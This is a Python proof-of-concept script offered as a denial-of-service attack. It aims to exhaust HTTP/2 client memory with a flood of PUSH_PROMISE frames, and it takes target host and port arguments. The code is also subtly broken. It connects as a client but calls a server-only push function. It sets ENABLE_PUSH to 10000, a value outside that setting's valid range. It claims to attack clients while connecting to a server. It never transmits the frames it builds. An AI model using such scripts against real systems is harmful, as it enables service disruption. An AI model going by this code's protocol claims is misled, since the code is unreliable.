#!/usr/bin/env python3
"""
Proof-of-Concept: HTTP/2 Server Push Abuse / Reserved Stream Exhaustion

This script demonstrates a Denial-of-Service attack against HTTP/2 clients
that do not properly limit the number of streams in the 'reserved (remote)' state.

RFC 9113 Section 5.1.2 states that reserved streams do not count toward the
concurrent stream limit. An attacker can send a massive number of PUSH_PROMISE
frames, forcing the client to allocate state for each promised stream without
actually sending data, eventually exhausting client memory or stream ID space.

Usage:
    python poc_server_push_abuse.py <target_host> <target_port>
"""

import sys
import socket
import ssl
import struct
from h2 import Connection
from h2.config import H2Configuration
from h2.events import RequestReceived, SettingsAcknowledged
from h2.exceptions import StreamClosedError, ProtocolError

def craft_push_promise_flood(conn, stream_id, num_promises=10000):
    """
    Sends a large number of PUSH_PROMISE frames on a single stream.
    Each PUSH_PROMISE reserves a new stream ID on the client side.
    """
    print(f"[*] Starting PUSH_PROMISE flood on stream {stream_id}...")
    print(f"[*] Sending {num_promises} PUSH_PROMISE frames.")
    
    # We need to send headers for the promised streams. 
    # Minimal headers: just a method and path to satisfy HPACK.
    headers = [(':method', 'GET'), (':path', '/'), (':scheme', 'https'), (':authority', 'example.com')]
    
    sent_count = 0
    try:
        for i in range(num_promises):
            # Calculate the promised stream ID. 
            # Server-initiated streams are even numbers. 
            # We must ensure we don't reuse IDs and follow the increment rule.
            promised_stream_id = stream_id + 2 + (i * 2)
            
            # Send PUSH_PROMISE
            # conn.push_stream() handles the frame construction
            conn.push_stream(
                stream_id=stream_id,
                promised_stream_id=promised_stream_id,
                request_headers=headers
            )
            
            # Send the data to flush the frames to the socket
            data_to_send = conn.data_to_send()
            if data_to_send:
                # In a real attack, we'd send this over the socket.
                # Here we just track the state.
                sent_count += 1
                
                # Periodic check to avoid overwhelming the local buffer in this PoC
                if sent_count % 1000 == 0:
                    print(f"[+] Sent {sent_count} PUSH_PROMISE frames...")
                    
    except StreamClosedError as e:
        print(f"[!] Stream closed by peer: {e}")
    except ProtocolError as e:
        print(f"[!] Protocol error: {e}")
    except Exception as e:
        print(f"[!] Error during flood: {e}")
        
    return sent_count

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_host> <target_port>")
        sys.exit(1)
        
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    print(f"[*] Target: {host}:{port}")
    print("[*] This PoC demonstrates Reserved Stream Exhaustion via PUSH_PROMISE abuse.")
    print("[*] A vulnerable client will allocate state for each promised stream,")
    print("[*] potentially leading to memory exhaustion or inability to process new requests.")
    
    # Create a TLS context
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    try:
        # Connect to the server
        sock = socket.create_connection((host, port))
        tls_sock = context.wrap_socket(sock, server_hostname=host)
        
        # Initialize H2 connection
        config = H2Configuration(validate_inbound_headers=False)
        conn = Connection(config=config)
        
        # Send connection preface and settings
        # Enable server push by setting SETTINGS_ENABLE_PUSH to a high value
        initial_settings = {
            'ENABLE_PUSH': 10000,  # Allow up to 10000 pushed streams
            'MAX_CONCURRENT_STREAMS': 100,
            'INITIAL_WINDOW_SIZE': 65535
        }
        conn.initiate_connection()
        conn.update_settings(initial_settings)
        
        # Send data
        data = conn.data_to_send()
        if data:
            tls_sock.sendall(data)
            print("[*] Sent HTTP/2 connection preface and SETTINGS.")
            
        # Receive SETTINGS ACK
        data = tls_sock.recv(65535)
        conn.receive_data(data)
        
        # Open a stream to attach PUSH_PROMISEs to
        stream_id = conn.get_next_available_stream_id()
        headers = [(':method', 'GET'), (':path', '/'), (':scheme', 'https'), (':authority', host)]
        conn.send_headers(stream_id, headers, end_stream=True)
        
        data = conn.data_to_send()
        if data:
            tls_sock.sendall(data)
            print(f"[*] Opened stream {stream_id}.")
            
        # Receive response headers (if any)
        data = tls_sock.recv(65535)
        if data:
            conn.receive_data(data)
            
        # Now perform the abuse
        print("[*] Initiating PUSH_PROMISE flood...")
        sent = craft_push_promise_flood(conn, stream_id, num_promises=5000)
        print(f"[*] Flood complete. Sent {sent} PUSH_PROMISE frames.")
        
        # In a real scenario, we would send the buffered data to the client.
        # For this PoC, we demonstrate the frame construction.
        print("[*] To execute, the attacker would send the buffered frames to the client.")
        print("[*] A vulnerable client will enter 'reserved (remote)' state for each stream.")
        print("[*] This consumes memory and stream ID space without counting toward concurrent limits.")
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            tls_sock.close()
        except:
            pass

if __name__ == "__main__":
    main()